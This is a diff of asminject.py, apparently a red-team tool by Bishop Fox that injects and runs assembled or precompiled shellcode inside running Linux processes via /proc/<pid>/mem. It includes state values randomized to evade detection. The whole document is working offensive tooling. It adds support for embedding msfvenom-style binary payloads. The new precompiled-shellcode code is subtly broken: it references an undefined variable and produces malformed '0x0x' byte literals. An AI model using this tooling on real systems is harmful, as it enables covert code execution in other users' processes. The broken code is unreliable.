@@ -12,8 +12,8 @@ BANNER = r"""
         \/                   \/\______|    \/     \/     \/|__|   \/
 
 asminject.py
-v0.8
-Ben Lincoln, Bishop Fox, 2022-05-06
+v0.9
+Ben Lincoln, Bishop Fox, 2022-05-09
 https://github.com/BishopFox/asminject
 based on dlinject, which is Copyright (c) 2019 David Buchanan
 dlinject source: https://github.com/DavidBuchanan314/dlinject
@@ -67,6 +67,9 @@ class asminject_parameters:
         self.sleep_time_waiting_for_syscalls = 0.1
         self.max_address_npic_suggestion = 0x00400000
         
+        self.wait_delay = 1.0
+        self.restore_delay = 0.0
+        
         # Randomized from initial state to make detection more challenging
         self.state_variable_max = 0xFFFFFF
         self.state_ready_for_shellcode_write = 47
@@ -84,7 +87,7 @@ class asminject_parameters:
         self.stop_method="sigstop"
         self.ansi=True
         self.pause=False
-        self.precompiled=False
+        self.precompiled_shellcode=None
         self.custom_replacements = {}
         self.delete_temp_files=True
         self.freeze_dir = "/sys/fs/cgroup/freezer/" + secrets.token_bytes(8).hex()
@@ -95,6 +98,10 @@ class asminject_parameters:
         self.asminject_affinity = None
         self.target_affinity = None
         self.target_process = None
+        
+        self.precompiled_shellcode_label = "precompiled_shellcode"
+        
+        self.enable_debugging_output = False
         
     def set_dynamic_process_info_vars(self):
         self.target_process = psutil.Process(self.pid)
@@ -142,15 +149,27 @@ def log_error(msg, ansi=True):
 
 def assemble(source, injection_params, library_bases, replacements = {}):
     formatted_source = source
+    for lname in library_bases.keys():
+        if injection_params.enable_debugging_output:
+            log(f"Library base entry: '{lname}'", ansi=injection_params.ansi)
+            
+    for rname in replacements.keys():
+        if injection_params.enable_debugging_output:
+            log(f"Replacement key: '{rname}', value '{replacements[rname]}'", ansi=injection_params.ansi)  
+    
     lname_placeholders = []
     lname_placeholders_matches = re.finditer(r'(\[BASEADDRESS:)(.*?)(:BASEADDRESS\])', formatted_source)
     for match in lname_placeholders_matches:
         placeholder_regex = match.group(2)
         if placeholder_regex not in lname_placeholders:
+            if injection_params.enable_debugging_output:
+                log(f"Found regex placeholder '{placeholder_regex}' in assembly code", ansi=injection_params.ansi)
             lname_placeholders.append(placeholder_regex)
     for lname_regex in lname_placeholders:
         found_library_match = False
         for lname in library_bases.keys():
+            if injection_params.enable_debugging_output:
+                log(f"Checking '{lname}' against regex placeholder '{lname_regex}' from assembly code", ansi=injection_params.ansi)
             if re.search(lname_regex, lname):
                 log(f"Using '{lname}' for regex placeholder '{lname_regex}' in assembly code", ansi=injection_params.ansi)
                 replacements[f"[BASEADDRESS:{lname_regex}:BASEADDRESS]"] = f"0x{library_bases[lname]['base']:016x}"
@@ -159,12 +178,9 @@ def assemble(source, injection_params, library_bases, replacements = {}):
             log_error(f"Could not find a match for the regular expression '{lname_regex}' in the list of libraries loaded by the target process. Make sure you've targeted the correct process, and that it is compatible with the selected payload.", ansi=injection_params.ansi)
             return None
     for fname in injection_params.relative_offsets.keys():
-        replacements[f"[RELATIVEOFFSET:{fname}:RELATIVEOFFSET]"] = f"0x{injection_params.relative_offsets[fname]:016x}"
+        replacements[f"[RELATIVEOFFSET:{fname}:RELATIVEOFFSET]"] = f"0x{injection_params.relative_offsets[fname]:016x}"    
 
     for search_text in replacements.keys():
-        #if search_text not in formatted_source:
-        #    log_error(f"Placeholder '{search_text}' in assembly source code was not found.", ansi=injection_params.ansi)
-            #sys.exit(1)
         formatted_source = formatted_source.replace(search_text, replacements[search_text])
     
     # check for any remaining placeholders in the formatted source code
@@ -176,8 +192,9 @@ def assemble(source, injection_params, library_bases, replacements = {}):
             missing_string = match.group(0)
             if missing_string not in missing_values:
                 missing_values.append(missing_string)
-    
-    #log(f"Formatted code:\n{formatted_source}", ansi=injection_params.ansi)
+                
+    if injection_params.enable_debugging_output:
+        log(f"Formatted assembly code:\n{formatted_source}", ansi=injection_params.ansi)
     
     if len(missing_values) > 0:
         log_error(f"The following placeholders in the assembly source code code not be found: {missing_values}", ansi=injection_params.ansi)
@@ -188,12 +205,13 @@ def assemble(source, injection_params, library_bases, replacements = {}):
     try:
         (tf, out_path) = tempfile.mkstemp(suffix=".o", dir=None, text=False)
         os.close(tf)
-        # output file is chmodded 0777 so that the target process' user account can delete it if necessary as well as reading it
-        try:
-            os.chmod(out_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
-        except Exception as e:
-            log_warning(f"Couldn't set permissions on '{out_path}': {e}", ansi=injection_params.ansi)
-        log(f"Writing assembled binary to {out_path}", ansi=injection_params.ansi)
+        # # output file is chmodded 0777 so that the target process' user account can delete it if necessary as well as reading it
+        # try:
+            # os.chmod(out_path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
+        # except Exception as e:
+            # log_warning(f"Couldn't set permissions on '{out_path}': {e}", ansi=injection_params.ansi)
+        if injection_params.enable_debugging_output:
+            log(f"Writing assembled binary to {out_path}", ansi=injection_params.ansi)
         #out_path = f"/tmp/assembled_{os.urandom(8).hex()}.bin"
         #cmd = "gcc -x assembler - -o {0} -nostdlib -Wl,--oformat=binary -m64 -fPIC".format()
         argv = ["gcc", "-x", "assembler", "-", "-o", out_path, "-nostdlib", "-Wl,--oformat=binary", "-m64", "-fPIC"]
@@ -208,7 +226,8 @@ def assemble(source, injection_params, library_bases, replacements = {}):
         program = formatted_source.encode()
         pipe = subprocess.PIPE
 
-        log(f"Assembler command: {argv}", ansi=injection_params.ansi)
+        if injection_params.enable_debugging_output:
+            log(f"Assembler command: {argv}", ansi=injection_params.ansi)
         result = subprocess.run(argv, stdout=pipe, stderr=pipe, input=program)
         
         if result.returncode != 0:
@@ -227,7 +246,8 @@ def assemble(source, injection_params, library_bases, replacements = {}):
                     log_warning(f"Couldn't set permissions on '{obj_out_path}': {e}", ansi=injection_params.ansi)
                 log(f"Converting executable '{out_path}' to raw binary file {obj_out_path}", ansi=injection_params.ansi)
                 argv = ["objcopy", "-O", "binary", out_path, obj_out_path]
-                #log(f"objdump command: {argv}", ansi=injection_params.ansi)
+                if injection_params.enable_debugging_output:
+                    log(f"objdump command: {argv}", ansi=injection_params.ansi)
                 result = subprocess.run(argv, stdout=pipe, stderr=pipe)
                 
                 if result.returncode != 0:
@@ -338,24 +358,27 @@ def wait_for_communication_state(pid, communication_address, wait_for_value):
                     rsp = syscall_check_result["rsp"]
                     sleep_this_iteration = True
                     if rip != 0 and rsp != 0:
-                        log(f"RSP is 0x{rsp:016x}", ansi=injection_params.ansi)
+                        if injection_params.enable_debugging_output:
+                            log(f"RSP is 0x{rsp:016x}", ansi=injection_params.ansi)
                         mem.seek(communication_address)
                         data.state_value = struct.unpack('Q', mem.read(8))[0]
                         mem.seek(communication_address + 8)
                         data.read_execute_address = struct.unpack('Q', mem.read(8))[0]
                         data.read_write_address = struct.unpack('Q', mem.read(8))[0]
-                        log(f"State value at communication address 0x{communication_address:08x} is 0x{data.state_value:016x}", ansi=injection_params.ansi)
-                        log(f"Read/execute block address at communication address 0x{communication_address:08x} + 8 is 0x{data.read_execute_address:016x}", ansi=injection_params.ansi)
-                        log(f"Read/write block address at communication address 0x{communication_address:08x} + 16 is 0x{data.read_write_address:016x}", ansi=injection_params.ansi)
+                        if injection_params.enable_debugging_output:
+                            log(f"State value at communication address 0x{communication_address:08x} is 0x{data.state_value:016x}", ansi=injection_params.ansi)
+                            log(f"Read/execute block address at communication address 0x{communication_address:08x} + 8 is 0x{data.read_execute_address:016x}", ansi=injection_params.ansi)
+                            log(f"Read/write block address at communication address 0x{communication_address:08x} + 16 is 0x{data.read_write_address:016x}", ansi=injection_params.ansi)
                         
                         if data.state_value == wait_for_value:
-                            log(f"Communications address value matches wait value 0x{wait_for_value:016x}", ansi=injection_params.ansi)
+                            if injection_params.enable_debugging_output:
+                                log(f"Communications address value matches wait value 0x{wait_for_value:016x}", ansi=injection_params.ansi)
                             sleep_this_iteration = False
                             done_waiting = True
                         
                     if sleep_this_iteration:
-                        log("Waiting for injected code", ansi=injection_params.ansi)
-                        time.sleep(1.0)
+                        log("Waiting for injected code to update the state value", ansi=injection_params.ansi)
+                        time.sleep(injection_params.wait_delay)
                 except Exception as e:
                     log_error(f"Couldn't get target process information: {e}, {syscall_data}", ansi=injection_params.ansi)
         except FileNotFoundError as e:
@@ -370,11 +393,22 @@ def asminject(injection_params):
     stage1_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, stage1_source_filename)
     if not os.path.isfile(stage1_path):
         log_error(f"Could not find the stage 1 source code '{stage1_path}'", ansi=injection_params.ansi)
-        continue_executing = False
+        sys.exit(1)
+        
+    stage2_template_source_filename = "stage2-template.s"
+    stage2_template_source_path = os.path.join(injection_params.base_script_path, "asm", injection_params.architecture, stage2_template_source_filename)
+    if not os.path.isfile(stage2_template_source_path):
+        log_error(f"Could not find the stage 2 template source code '{stage2_template_source_path}'", ansi=injection_params.ansi)
+        sys.exit(1)
 
     if not os.path.isfile(injection_params.asm_path):
-        log_error(f"Could not find the stage 2 file '{injection_params.asm_path}'", ansi=injection_params.ansi)
-        return
+        log_error(f"Could not find the stage 2 shellcode file '{injection_params.asm_path}'", ansi=injection_params.ansi)
+        sys.exit(1)
+        
+    if injection_params.precompiled_shellcode:
+        if not os.path.isfile(injection_params.precompiled_shellcode):
+            log_error(f"Could not find the precompiled binary shellcode file '{injection_params.precompiled_shellcode}'", ansi=injection_params.ansi)
+            sys.exit(1)
 
     if injection_params.stop_method == "sigstop":
         log("Sending SIGSTOP", ansi=injection_params.ansi)
@@ -500,9 +534,6 @@ def asminject(injection_params):
                     communication_address_backup = mem.read(injection_params.communication_address_backup_size)
                     
                     # Set the "memory restored" state variable to match the first 8 bytes of the backed up communications address data
-                    #low_half = struct.unpack('I', communication_address_backup[0:4])[0]
-                    #high_half = struct.unpack('I', communication_address_backup[4:8])[0] << 32
-                    #injection_params.state_memory_restored = high_half | low_half
                     injection_params.state_memory_restored = struct.unpack('I', communication_address_backup[0:4])[0]
                     log(f"Will specify 0x{injection_params.state_shellcode_written:016x} @ 0x{communication_address:016x} as the 'memory restored' value", ansi=injection_params.ansi)
 
@@ -542,31 +573,62 @@ def asminject(injection_params):
 
         if continue_executing:
             stage2 = None
+            
+            stage2_replacements = injection_params.custom_replacements
+            stage2_replacements['[VARIABLE:RIP:VARIABLE]'] = f"{rip}"
+            stage2_replacements['[VARIABLE:RSP:VARIABLE]'] = f"{rsp}"
+            stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
+            stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
+            stage2_replacements['[VARIABLE:CODE_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, code_backup))
+            stage2_replacements['[VARIABLE:STACK_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, stack_backup))
+            stage2_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(rsp-injection_params.stack_backup_size)}"
+            stage2_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
+            stage2_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_ready_for_memory_restore}"
+            stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_memory_restored}"
+            stage2_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.cpu_state_size}"
+            
+            current_state = wait_for_communication_state(injection_params.pid, communication_address, injection_params.state_ready_for_shellcode_write)
+            stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address}"
+            stage2_replacements['[VARIABLE:NEW_STACK_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address + injection_params.cpu_state_size}"
+            stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{current_state.read_write_address + injection_params.read_write_block_size - 8}"
+            
+            stage2_source_code = ""
+            shellcode_source_code = ""
+            try:
+                with open(stage2_template_source_path, "r") as asm_source_code_file:
+                    stage2_source_code = asm_source_code_file.read()
+            except Exception as e:
+                log_error(f"Couldn't read the stage 2 template source code file '{stage2_template_source_path}': {e}", ansi=injection_params.ansi)
+                sys.exit(1)
+            
+            try:
+                with open(injection_params.asm_path, "r") as shellcode_source_code_file:
+                    shellcode_source_code = shellcode_source_code_file.read()
+            except Exception as e:
+                log_error(f"Couldn't read the stage 2 template source code file '{injection_params.asm_path}': {e}", ansi=injection_params.ansi)
+                sys.exit(1)
+            
+            shellcode_source_code_split = shellcode_source_code.split("BEGIN_SHELLCODE_DATA")
+            
+            stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_SOURCE:VARIABLE]', shellcode_source_code_split[0])
+            shellcode_data_section = shellcode_source_code_split[1]
+            
+            if injection_params.precompiled_shellcode:
+                with open(injection_params.precompiled_shellcode, "rb") as precompiled_shellcode_file:
+                    precompiled_payload = precompiled_shellcode_file.read()
+                    precompiled_shellcode_as_hex = ""
+                    for byte_num in range(0, len(precompiled_payload)):
+                        if byte_num == 0:
+                            precompiled_shellcode_as_hex = f"0x{hex(precompiled_payload[byte_num])}"
+                        else:
+                            precompiled_shellcode_as_hex = f"{precompiled_shellcode_as_hex}, 0x{hex(precompiled_payload[byte_num])}"
+                    
+                    shellcode_data_section = f"{shellcode_data_section}\n:{injection_params.precompiled_shellcode_label}:\n\t.byte {precompiled_shellcode_as_hex}{ascii_hex_shellcode}"
+
+            stage2_source_code = stage2_source_code.replace('[VARIABLE:SHELLCODE_DATA:VARIABLE]', shellcode_data_section)
+
+            stage2 = assemble(stage2_source_code, injection_params, library_bases, replacements=stage2_replacements)
                 
-            if injection_params.precompiled:
-                with open(injection_params.asm_path, "rb") as asm_code:
-                    stage2 = asm_code.read()
-            else:
-                stage2_replacements = injection_params.custom_replacements
-                stage2_replacements['[VARIABLE:RIP:VARIABLE]'] = f"{rip}"
-                stage2_replacements['[VARIABLE:RSP:VARIABLE]'] = f"{rsp}"
-                stage2_replacements['[VARIABLE:LEN_CODE_BACKUP:VARIABLE]'] = f"{len(code_backup)}"
-                stage2_replacements['[VARIABLE:STACK_BACKUP_SIZE:VARIABLE]'] = f"{injection_params.stack_backup_size}"
-                stage2_replacements['[VARIABLE:CODE_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, code_backup))
-                stage2_replacements['[VARIABLE:STACK_BACKUP_JOIN:VARIABLE]'] = ",".join(map(str, stack_backup))
-                stage2_replacements['[VARIABLE:RSP_MINUS_STACK_BACKUP_SIZE:VARIABLE]'] = f"{(rsp-injection_params.stack_backup_size)}"
-                stage2_replacements['[VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]'] = f"{communication_address}"
-                stage2_replacements['[VARIABLE:STATE_READY_FOR_MEMORY_RESTORE:VARIABLE]'] = f"{injection_params.state_ready_for_memory_restore}"
-                stage2_replacements['[VARIABLE:STATE_MEMORY_RESTORED:VARIABLE]'] = f"{injection_params.state_memory_restored}"
-                stage2_replacements['[VARIABLE:CPU_STATE_SIZE:VARIABLE]'] = f"{injection_params.cpu_state_size}"
-                
-                current_state = wait_for_communication_state(injection_params.pid, communication_address, injection_params.state_ready_for_shellcode_write)
-                stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address}"
-                stage2_replacements['[VARIABLE:NEW_STACK_ADDRESS:VARIABLE]'] = f"{current_state.read_write_address + injection_params.cpu_state_size}"
-                stage2_replacements['[VARIABLE:READ_WRITE_ADDRESS_END:VARIABLE]'] = f"{current_state.read_write_address + injection_params.read_write_block_size - 8}"
-                
-                with open(injection_params.asm_path, "r") as asm_code:
-                    stage2 = assemble(asm_code.read(), injection_params, library_bases, replacements=stage2_replacements)
             
             if not stage2:
                 continue_executing = False
@@ -584,6 +646,9 @@ def asminject(injection_params):
                     mem.write(ok_val)
                     log("Stage 2 proceeding", ansi=injection_params.ansi)
                 
+                if injection_params.restore_delay > 0.0:
+                    log(f"Waiting {injection_params.restore_delay} second(s) before starting memory restore check", ansi=injection_params.ansi)
+                    time.sleep(injection_params.restore_delay)
                 current_state = wait_for_communication_state(injection_params.pid, communication_address, injection_params.state_ready_for_memory_restore)
                 log("Restoring original memory content", ansi=injection_params.ansi)
                 with open(f"/proc/{injection_params.pid}/mem", "wb+") as mem:
@@ -658,16 +723,19 @@ if __name__ == "__main__":
         help="Disable ANSI formatting for console output")
     
     parser.add_argument("--pause", type=str2bool, nargs='?',
-        const=True, default=True,
+        const=True, default=False,
         help="Prompt for input before resuming/unfreezing the target process")
     
-    parser.add_argument("--precompiled", type=str2bool, nargs='?',
-        const=True, default=False,
-        help="Treat the stage 2 payload as a binary that has already been compiled (e.g. msfvenom output) and do not attempt to compile it from source code")
+    parser.add_argument("--precompiled", type=str, 
+        help="Path to a precompiled binary shellcode payload to embed and launch (requires use of e.g. precompiled.s)")
 
     parser.add_argument("--preserve-temp-files", type=str2bool, nargs='?',
         const=True, default=False,
         help="Do not delete temporary files created during the assembling and linking process")
+        
+    parser.add_argument("--debug", type=str2bool, nargs='?',
+        const=True, default=False,
+        help="Enable debugging messages")
         
     args = parser.parse_args()
 
@@ -676,6 +744,8 @@ if __name__ == "__main__":
     if args.var:
         for var_set in args.var:
             injection_params.custom_replacements[f"[VARIABLE:{var_set[0]}:VARIABLE]"] = var_set[1]
+            injection_params.custom_replacements[f"[VARIABLE:{var_set[0]}.length:VARIABLE]"] = str(len(var_set[1]))
+            
 
     injection_params.base_script_path = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
     injection_params.pid = args.pid
@@ -683,11 +753,14 @@ if __name__ == "__main__":
     injection_params.architecture = args.arch
     injection_params.stop_method = args.stop_method
     injection_params.pause = args.pause
-    injection_params.precompiled = args.precompiled
     injection_params.ansi = args.plaintext
+    injection_params.enable_debugging_output = args.debug
     
     if args.preserve_temp_files:
         injection_params.delete_temp_files = False
+
+    if args.precompiled:
+        injection_params.precompiled_shellcode = os.path.abspath(args.precompiled)
     
     # readelf -a --wide /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > offsets-libc-2.31.so.txt
     if args.relative_offsets:
@@ -709,8 +782,7 @@ if __name__ == "__main__":
                                 #    log_warning(f"Ignoring offset '{offset_name}' in '{reloff_abs_path}' because it has a value of zero", ansi=args.plaintext)
     
     if len(injection_params.relative_offsets) < 1:
-        if not injection_params.precompiled:
-            log_error("A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.", ansi=args.plaintext)
+        log_error("A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.", ansi=args.plaintext)
     
     if args.non_pic_binary:
         if len(args.non_pic_binary) > 0:
